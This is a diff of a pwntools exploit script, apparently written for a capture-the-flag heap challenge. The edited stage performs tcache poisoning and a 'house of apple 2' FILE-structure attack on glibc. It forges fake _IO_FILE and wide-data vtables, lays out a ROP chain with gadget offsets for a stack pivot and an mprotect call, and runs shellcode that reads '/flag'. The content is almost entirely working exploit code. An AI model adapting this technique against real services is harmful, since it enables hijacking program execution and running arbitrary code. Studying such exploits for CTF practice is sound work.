@@ -56,12 +56,13 @@ edit(1, p64(glibc_base_addr+glibc_e.symbols['main_arena']+1104)*2+p64(heap_base_
 create(6, 0x438)
 
 # Stage 3: tcache poisoning for house of apple 2
+# _IO_cleanup-> _IO_flush_all->_IO_wfile_overflow->_IO_wdoallocbuf
 target_addr = heap_base_addr+0x3e00
 payload = flat({
     # fp
     0: {
-        0x20: target_addr, # fp->_IO_write_base
-        0x28: target_addr+1, # fp->_IO_write_ptr
+        0x20: 0, # fp->_IO_write_base
+        0x28: 1, # fp->_IO_write_ptr
         0x88: glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock'], # fp->_lock
         0xa0: target_addr+0xe0, # fp->_wide_data
         0xd8: glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps'] # fp->vtable
@@ -69,12 +70,12 @@ payload = flat({
     # fp->_wide_data/fp->_wide_data->_wide_vtable
     0xe0: {
         0x18: 0, # fp->_wide_data->_IO_write_base
-        0x20: [glibc_base_addr+glibc_e.symbols['do_release_shlib']+27, target_addr+0xe0+0x70-8], # 0x00000000000368ab: pop rbp; clc; leave; ret;
+        0x20: [glibc_base_addr+glibc_e.symbols['do_release_shlib']+27, target_addr+0xe0+0x70-0x8], # 0x00000000000368ab: pop rbp; clc; leave; ret;
         0x30: 0, # fp->_wide_data->_IO_buf_base
         0x38: target_addr+0xe0+0x40-0x20,
         0x40: glibc_base_addr+glibc_e.symbols['__push___start_context']+63, # 0x000000000005ef6f: mov rsp, rdx; ret;
         0x68: glibc_base_addr+glibc_e.symbols['__rpc_thread_key_cleanup']+46, # 0x0000000000176f0e: mov rdx, qword ptr [rax + 0x38]; mov rdi, rax; call qword ptr [rdx + 0x20];
-        0x70: [glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'))), (target_addr)&(~0xfff), glibc_base_addr+next(glibc_e.search(asm('pop rsi; ret;'))), 0x1000, glibc_base_addr+glibc_e.symbols['dlopen_doit']+106, target_addr+0xe0+0xb0-8, 0, 7, glibc_base_addr+glibc_e.sym.mprotect, target_addr+0xe0+0xe8], # 0x00000000000981aa: pop rbp; clc; pop rax; pop rdx; leave; ret;
+        0x70: [glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'))), (target_addr)&(~0xfff), glibc_base_addr+next(glibc_e.search(asm('pop rsi; ret;'))), 0x1000, glibc_base_addr+glibc_e.symbols['dlopen_doit']+106, target_addr+0xe0+0xb0-0x8, 0, 7, glibc_base_addr+glibc_e.sym.mprotect, target_addr+0xe0+0xe8], # 0x00000000000981aa: pop rbp; clc; pop rax; pop rdx; leave; ret;
         0xe0: target_addr+0xe0, # fp->_wide_data->_wide_vtable
         0xe8: asm('''
             lea rdi, [rip+flag]
@@ -91,7 +92,7 @@ payload = flat({
                 .string "/flag"
         ''')
     }
-}, filler='\x00')
+}, filler='\x00', length=0x208)
 # arbitrary write 0x208 bytes at most from heap_base_addr+0x3e00
 create(7, 0x208)
 create(8, 0x208)
